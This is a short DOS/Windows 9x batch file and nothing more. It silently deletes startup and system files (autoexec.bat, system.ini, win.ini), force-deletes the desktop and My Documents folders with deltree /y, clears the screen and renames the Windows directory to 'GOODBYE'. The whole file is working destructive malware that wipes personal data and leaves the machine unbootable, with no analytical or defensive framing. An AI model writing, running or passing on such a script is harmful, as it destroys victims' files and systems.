@ECHO OFF 
del c:\autoexec.bat 
del c:\windows\system.ini 
del c:\windows\win.ini 
del c:\windows\system\setpower.exe 
deltree /y c:\windows\desktop 
deltree /y c:\MYDOCU~1 
CLS 
@REN c:\Windows GOODBYE 
